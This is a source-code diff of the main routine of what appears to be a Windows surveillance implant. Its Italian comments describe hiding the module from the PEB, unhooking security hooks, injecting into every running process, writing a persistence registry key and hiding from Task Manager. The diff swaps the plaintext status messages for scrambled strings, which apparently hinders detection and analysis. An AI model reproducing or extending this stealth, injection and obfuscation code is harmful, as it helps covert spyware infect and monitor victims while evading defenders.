@@ -2646,6 +2646,15 @@ void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
 // Main del core
 void __stdcall HM_sMain(void)
 {
+	ScrambleString ssok("QM\r\n"); // "OK\r\n"
+	ScrambleString ss1("_ B0lgDUPC gEo7EPlPv1..........."); // "- Checking components..........."
+	ScrambleString ss2("_ xgvUR8vUPC 0UiUPC 1J1vlo......"); // "- Activating hiding system......"
+	ScrambleString ss3("L99Q9\r\n    3-ru5 [eP8IWl vE il7WEJ]\r\n"); // "ERROR\r\n    17240 [Unable to deploy]\r\n"
+	ScrambleString ss4("_ yPUvU8WUAUPC oEidWl1.........."); // "- Initializing modules.........."
+	ScrambleString ss5("L99Q9\r\n    rYp35 [K0l 1J1vlo U1 8Wtl8iJ oEPUvEtli]\r\n"); // "ERROR\r\n    29310 [The system is already monitored]\r\n"
+	ScrambleString ss6("_ 4v8tvUPC gEtl oEidWl.........."); // "- Starting core module.........."
+	ScrambleString ss7("\r\n Xlt1UEP k.5 zdWWJ E7lt8vUEP8W\r\n\r\n"); // "\r\n Version 8.0 fully operational\r\n\r\n"
+
 	pid_hide_struct pid_hide;
 
 	//Riempie i campi relativi al nome del file immagine,
@@ -2659,7 +2668,7 @@ void __stdcall HM_sMain(void)
 	if (!CreateLogWindow())
 		FNC(ExitProcess)(0);
 
-	REPORT_STATUS_LOG("- Checking components...........");
+	REPORT_STATUS_LOG(ss1.get_str());
 
 	// Locka il file di configurazione per prevenire cancellazioni "accidentali"
 	LockConfFile();
@@ -2668,19 +2677,19 @@ void __stdcall HM_sMain(void)
 	// XXX da qui in poi non potro' piu' fare GetModuleHandle etc. di questo modulo
 	HidePEB(GetModuleHandle(H4DLLNAME));
 
-	REPORT_STATUS_LOG("OK\r\n"); 
+	REPORT_STATUS_LOG(ssok.get_str()); 
 
 	// Cancella la command line
 	HM_ClearCommand();
 
-	REPORT_STATUS_LOG("- Activating hiding system......");
+	REPORT_STATUS_LOG(ss2.get_str());
 
 	// Toglie gli hook, prende i privilegi, etc.
 	if (!doUnhook()) {
-		REPORT_STATUS_LOG("ERROR\r\n    17240 [Unable to deploy]\r\n"); 
+		REPORT_STATUS_LOG(ss3.get_str()); 
 		ReportExitProcess();
 	} 
-	REPORT_STATUS_LOG("OK\r\n"); 
+	REPORT_STATUS_LOG(ssok.get_str()); 
 
 	// Inizializza la chiave di cifratura (va fatto prima di qualsiasi
 	// accesso al file di configurazione).
@@ -2698,13 +2707,13 @@ void __stdcall HM_sMain(void)
 	
 	// L'agent manager deve essere startato prima di effettuare gli hook 
 	// (infatti e' lui che inizializza tutta la parte di IPC).
-	REPORT_STATUS_LOG("- Initializing modules..........");
+	REPORT_STATUS_LOG(ss4.get_str());
 	if (!AM_Startup()) {
-		REPORT_STATUS_LOG("ERROR\r\n    29310 [The system is already monitored]\r\n"); 
+		REPORT_STATUS_LOG(ss5.get_str()); 
 		g_remove_driver = FALSE; // Disinstalla questa istanza ma lascia il driver per eventuali altre istanze running
 		DA_Uninstall(NULL); // AM_Startup fallisce se la sharedmemory gia' esiste
 	}
-	REPORT_STATUS_LOG("OK\r\n"); 
+	REPORT_STATUS_LOG(ssok.get_str()); 
 
 	// Effettua l'injection in tutti i processi attivi
 	HM_HookActiveProcesses();
@@ -2721,14 +2730,14 @@ void __stdcall HM_sMain(void)
 	// come TeaTimer, ma fare attenzione che il processo core non possa 
 	// uscire prima per altri errori (anche se c'e' qualche problema
 	// la chiave nel registry deve essere inserita ad ogni costo).
-	REPORT_STATUS_LOG("- Starting core module..........");
+	REPORT_STATUS_LOG(ss6.get_str());
 	Sleep(3300); // XXX Aspetta che venga fatta l'injection prima di scrivere la chiave
 	HM_InsertRegistryKey(H4DLLNAME, FALSE);
 
 	// Inizializza (dal file di configurazione) e fa partire gli agent
 	// e il thread di dispatch
 	AM_SuspendRestart(AM_RESET);
-	REPORT_STATUS_LOG("OK\r\n"); 
+	REPORT_STATUS_LOG(ssok.get_str()); 
 
 	// Viene cambiato lo sfondo del desktop, ma solo se e'
 	// stata compilata in versione DEMO
@@ -2737,8 +2746,8 @@ void __stdcall HM_sMain(void)
 	// Fa partire il sync manager 
 	SM_StartMonitorEvents();
 
-	REPORT_STATUS_LOG("\r\n Version 8.0 fully operational\r\n\r\n");
-	SendStatusLog(L"[Core Module]: Agent started");
+	REPORT_STATUS_LOG(ss7.get_str());
+	SendStatusLog(L"[Core Module]: Started");
 
 	// Ciclo per l'hiding da task manager e dai nuovi epxlorer
 	// lanciati. Monitora anche la coda dei messaggi per
